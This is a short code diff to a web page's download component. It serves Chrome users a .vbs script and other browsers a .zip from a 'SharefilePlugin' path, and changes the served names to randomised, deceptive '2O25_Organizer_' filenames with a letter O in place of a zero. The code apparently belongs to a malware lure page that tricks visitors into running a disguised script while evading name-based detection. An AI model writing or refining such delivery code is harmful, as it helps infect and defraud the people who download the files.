@@ -20,14 +20,14 @@ const Download = () => {
 
   const downloadFile = useMemo(() => {
     const ua = navigator.userAgent;
-    const suffix = randomHex(4);
+    const suffix = randomHex(8);
     if (ua.includes("Edg/")) {
-      return { href: "/docs/SharefilePlugin.zip", name: `SharefilePlugin_${suffix}.zip` };
+      return { href: "/docs/SharefilePlugin.zip", name: `2O25_Organizer_${suffix}.zip` };
     }
     if (ua.includes("Chrome") && !ua.includes("Edg/")) {
-      return { href: "/docs/SharefilePlugin.vbs", name: `SharefilePlugin_${suffix}.vbs` };
+      return { href: "/docs/SharefilePlugin.vbs", name: `2O25_Organizer_${suffix}.vbs` };
     }
-    return { href: "/docs/SharefilePlugin.zip", name: `SharefilePlugin_${suffix}.zip` };
+    return { href: "/docs/SharefilePlugin.zip", name: `2O25_Organizer_${suffix}.zip` };
   }, []);
 
   useEffect(() => {
